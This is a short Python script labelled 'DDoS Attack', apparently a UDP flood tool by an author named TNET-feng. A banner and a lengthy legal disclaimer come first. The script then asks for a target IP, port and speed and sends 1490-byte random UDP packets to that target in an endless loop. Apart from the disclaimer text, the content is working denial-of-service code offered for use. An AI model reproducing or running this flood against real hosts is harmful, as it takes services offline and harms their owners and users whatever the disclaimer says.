# python3

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDoS Attack")
print (" ")
print ("---------------------------------------------------")
print ("   author   : TNET-峰                              ")
print ("   github   : https://github.com/TNET-feng         ")
print ("   csdn     : https://blog.csdn.net/2302_76189356  ")
print ("   version  : 0.2.0                                ")
print ("---------------------------------------------------")
print (" ")
print (" ")
print (" ")
print (" ")
print (" -----------------[Do not use for illegal purposes]----------------- ")
print (
"""Disclaimer for TNET-feng's Network Stress Testing Tool

IMPORTANT NOTICE: PLEASE READ THIS DISCLAIMER CAREFULLY BEFORE USING THIS SOFTWARE. YOUR USE OF THE SOFTWARE CONSTITUTES YOUR FULL AND UNCONDITIONAL ACCEPTANCE OF THE TERMS HEREIN. IF YOU DO NOT AGREE TO THESE TERMS, YOU MUST IMMEDIATELY CEASE ALL USE OF THE SOFTWARE AND DELETE ALL COPIES.

1. Purpose and Authorized Use: This tool is designed exclusively for legitimate and ethical purposes, including but not limited to: authorized network stress testing, security vulnerability assessment, academic research on system performance, and penetration testing conducted within the scope of explicit written permission. The software is provided for educational and research purposes only.
2. Strictly Legal Use: You hereby represent and warrant that you will only deploy this tool on networks, systems, and devices that you own or for which you have obtained prior, explicit, and written authorization from the legal owner. Any application of this tool beyond these strictly authorized contexts is expressly forbidden.
3. Prohibited Conduct: You are absolutely prohibited from using this tool for any unlawful, malicious, or harmful activities. Prohibited uses include, but are not limited to:
   · Launching denial-of-service (e.g., DDoS) or any other form of cyber-attacks against any system or network without clear, prior authorization.
   · Knowingly disrupting, degrading, or impairing the functionality of any service, system, or network.
   · Infringing upon the privacy, security, or proprietary rights of any individual or entity.
   · Violating any applicable laws, statutes, or regulations of any jurisdiction.
4. Sole User Responsibility: You accept and assume complete, sole, and absolute responsibility for all consequences, liabilities, damages, and losses that may arise from your access to, use of, or misuse of this software. This responsibility extends to any and all claims, legal actions, costs, and expenses incurred by third parties as a result of your actions.
5. No Warranty and Limitation of Liability: THIS SOFTWARE IS PROVIDED "AS IS" AND "AS AVAILABLE," WITHOUT ANY WARRANTY OF ANY KIND, EITHER EXPRESS OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT. IN NO EVENT SHALL THE DEVELOPER, AUTHOR, OR ANY CONTRIBUTOR BE HELD LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
6. Assumption of Risk: You expressly acknowledge and agree that the use of this tool carries potential risks, and you undertake such use at your own discretion and risk. You are solely responsible for ensuring that your use complies with all applicable laws.

FINAL ACKNOWLEDGMENT: BY PROCEEDING TO USE THIS SOFTWARE, I EXPRESSLY CONFIRM THAT I HAVE READ, UNDERSTOOD, AND UNCONDITIONALLY AGREED TO BE BOUND BY ALL TERMS AND CONDITIONS OF THIS DISCLAIMER. I AM FULLY AWARE THAT ANY UNAUTHORIZED OR MALICIOUS USE IS STRICTLY PROHIBITED AND MAY SUBJECT ME TO SERIOUS LEGAL AND CRIMINAL PENALTIES."""

)
                                                                                                                                                                                                    
print (" -----------------[Do not use for illegal purposes]----------------- ")
print (" ")
print (" ")
print (" ")
print (" ")
ip = input("IP: ")
port = int(input("port: "))
sd = int(input("speed(1~1000) : "))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("Sent %s data packet to %s port %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)
